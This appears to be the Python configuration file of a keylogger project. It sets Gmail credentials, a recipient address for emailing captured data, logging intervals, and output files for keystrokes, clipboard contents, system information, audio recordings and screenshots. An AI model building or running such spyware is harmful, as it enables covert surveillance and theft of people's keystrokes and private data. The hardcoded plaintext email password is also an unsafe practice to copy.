import os

email_address = "testapiemail0000@gmail.com"  # Enter disposable email here
password = "apiTest123(xd)"  # Enter email password here
to_address = "mkoziel045@gmail.com"  # Enter the email address you want to send your information to

file_path = os.path.dirname(__file__)

time_iteration = 5  # Enter time of each iteration in seconds for key logger
number_of_iterations_end = 3  # Enter number of iterations of key logger

key_filename = "encryption_key.txt"

filenames = {
    "keys": "keys_info.txt",
    "system_info": "system_info.txt",
    "clipboard": "e_clipboard.txt",
    "audio": "audio.wav",
    "screenshot": "screenshot.png"
}
